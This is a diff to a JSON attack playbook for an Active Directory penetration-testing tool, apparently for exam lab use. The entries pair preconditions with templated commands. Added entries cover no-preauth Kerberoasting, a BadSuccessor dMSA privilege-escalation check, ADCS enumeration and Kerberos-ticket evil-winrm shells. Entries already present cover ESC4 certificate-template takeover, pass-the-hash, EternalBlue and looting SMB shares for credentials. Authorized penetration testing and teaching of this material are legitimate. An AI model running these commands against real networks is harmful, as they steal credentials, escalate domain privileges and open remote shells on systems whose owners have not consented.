@@ -243,13 +243,12 @@
         "nxc",
         "windapsearch"
       ],
-      "os": [
-        "windows"
-      ],
+      "os": [],
       "requires_all": [],
       "requires_any": [
         "ldap.reachable",
-        "port:389"
+        "port:389",
+        "port:636"
       ],
       "produces": [
         "ad.base_dn",
@@ -759,6 +758,7 @@
     },
     {
       "id": "smb-share-inventory",
+      "transition": "loot_browse",
       "sequence": true,
       "title": "Inventory Readable SMB Shares",
       "hypothesis": "A readable SMB share is a loot goldmine: configs, backups, scripts, and password stores are routinely left world- or domain-readable. Recursively inventory every readable share so obol can triage the file names for credential material to pull.",
@@ -922,6 +922,7 @@
       "tool": "impacket-GetUserSPNs",
       "tools": [
         "impacket-GetUserSPNs",
+        "nxc",
         "targetedKerberoast",
         "hashcat",
         "Rubeus"
@@ -930,11 +931,11 @@
         "windows"
       ],
       "requires_all": [
-        "credential.available"
+        "kerberos.reachable"
       ],
       "requires_any": [
-        "kerberos.reachable",
-        "port:88"
+        "credential.available",
+        "hash.asrep"
       ],
       "obsoleted_by": [
         "loot.ntds"
@@ -989,6 +990,11 @@
           "tool": "sh",
           "run": "grep -h '\\$krb5tgs\\$' {{hashfile}} | sort -u > tgs-clean.txt && wc -l tgs-clean.txt",
           "note": "HANDOFF - strip duplicates from the roast file (nxc and impacket append on repeat runs), then run hashcat -m 13100 tgs-clean.txt {{wordlist}}. The sidebar hashfile should reference the source file."
+        },
+        {
+          "tool": "impacket-GetUserSPNs",
+          "run": "impacket-GetUserSPNs -no-preauth {{user}} -usersfile {{userlist}} -dc-host {{target}} {{domain}}/",
+          "note": "No-preauth Kerberoasting (AS-REP principal pivot): when an account has DONT_REQ_PREAUTH enabled (hash.asrep), request TGS tickets for SPN accounts listed in {{userlist}} without knowing any password."
         }
       ]
     },
@@ -1310,6 +1316,16 @@
           "tool": "cmd",
           "run": "cmd /c \"whoami /groups & whoami /priv & net user {{user}} /domain & net group \\\"Domain Admins\\\" /domain\"",
           "note": "LANE 3 (built-in, nothing to upload): your group memberships + privileges (SeImpersonate/SeBackup/SeRestore are instant local-SYSTEM leads), plus the account and DA roster. Always available, even on a locked-down box where you can't run PowerView."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M badsuccessor",
+          "settled_by": [
+            "ad.acl_lead",
+            "ad.control_paths",
+            "kerberos.tickets"
+          ],
+          "note": "Check Windows Server 2025 dMSA (BadSuccessor) privilege escalation: identifies principals permitted to create delegated Managed Service Accounts in writable OUs."
         }
       ]
     },
@@ -1438,7 +1454,8 @@
         "ad.control_paths",
         "ad.domain_control",
         "ad.sid_history",
-        "kerberos.tickets"
+        "kerberos.tickets",
+        "loot.ntds"
       ],
       "produces": [
         "loot.ntds",
@@ -1763,6 +1780,7 @@
       "tool": "certipy",
       "tools": [
         "certipy",
+        "nxc",
         "coercer",
         "ntlmrelayx"
       ],
@@ -1867,6 +1885,11 @@
           "tool": "certipy",
           "run": "certipy template -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{target}} -template '{{template}}' -save-old -write-default-configuration",
           "note": "ESC4 (Template Write ACL): when your user holds WriteProperty/WriteDacl on a template, flip it to an ESC1-vulnerable configuration (-save-old backs up the original so you can restore it with -configuration)."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M adcs",
+          "note": "Enumerate Active Directory Certificate Services enterprise CAs, web enrollment URLs, and certificate templates over LDAP via NetExec."
         }
       ]
     },
@@ -3084,7 +3107,12 @@
       ],
       "requires_all": [],
       "requires_any": [
-        "ad.computer_added"
+        "ad.computer_added",
+        "ad.delegation",
+        "ad.delegation_constrained",
+        "ad.rbcd",
+        "ad.gmsa",
+        "ad.control_paths"
       ],
       "deprioritize_when": [
         "loot.ntds"
@@ -3819,6 +3847,7 @@
       ],
       "requires_any": [
         "hash.ntlm",
+        "credential.ntlm_hash",
         "loot.ntds"
       ],
       "deprioritize_when": [
@@ -4061,6 +4090,7 @@
     },
     {
       "id": "eternalblue",
+      "speculative": true,
       "title": "EternalBlue, MS17-010 SMB Remote Code Execution (CVE-2017-0144)",
       "hypothesis": "An unpatched SMBv1 server (MS17-010) can be exploited for remote code execution as SYSTEM without credentials. Once nmap's smb-vuln-ms17-010 flags the host VULNERABLE, a scripted public exploit (or the Metasploit module) lands a SYSTEM shell directly. On the exam, prefer the scripted exploit, Metasploit is limited to a single target.",
       "tool": "metasploit",
@@ -4692,6 +4722,8 @@
         "credential.available",
         "credential.password",
         "credential.plaintext",
+        "credential.certificate",
+        "kerberos.tickets",
         "winrm.authenticated",
         "hash.ntlm",
         "host.rdp_enabled",
@@ -4726,7 +4758,10 @@
         {
           "tool": "evil-winrm",
           "locus": "onhost",
-          "requires_port": 5985,
+          "requires_port": [
+            5985,
+            5986
+          ],
           "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
           "note": "PORT 5985 WinRM SHELL (Recommended when port 5985 is open or enabled): Fast, full interactive PowerShell remoting shell. Works for standard domain users with remote management rights without requiring local Administrator privileges.",
           "web_note": "WINRM INTERACTIVE SHELL (Port 5985): Connect directly to an interactive PowerShell session."
@@ -4734,7 +4769,10 @@
         {
           "tool": "evil-winrm",
           "locus": "onhost",
-          "requires_port": 5985,
+          "requires_port": [
+            5985,
+            5986
+          ],
           "run": "evil-winrm -i {{target}} -u '{{user}}' -H '{{nthash}}'",
           "note": "PORT 5985 WinRM PASS-THE-HASH: Full interactive PowerShell remoting shell using a captured NT hash."
         },
@@ -4793,9 +4831,22 @@
         {
           "tool": "evil-winrm",
           "locus": "onhost",
-          "requires_port": 5985,
+          "requires_port": [
+            5985,
+            5986
+          ],
           "run": "evil-winrm -i {{target}} -c {{cert_file}} -k {{key_file}} -S",
           "note": "WinRM certificate authentication (SSL): Log in using an extracted client certificate (.crt) and decrypted private key (.key) without a user password over WinRM SSL port 5986 (or 5985 with -S)."
+        },
+        {
+          "tool": "evil-winrm",
+          "locus": "onhost",
+          "requires_port": [
+            5985,
+            5986
+          ],
+          "run": "evil-winrm -i {{target}} -r {{domain}}",
+          "note": "Kerberos ticket WinRM shell: export KRB5CCNAME=<ticket.ccache> and connect with -r {{domain}} (targeting the host FQDN in /etc/hosts and /etc/krb5.conf)."
         }
       ],
       "deprioritize_when": [
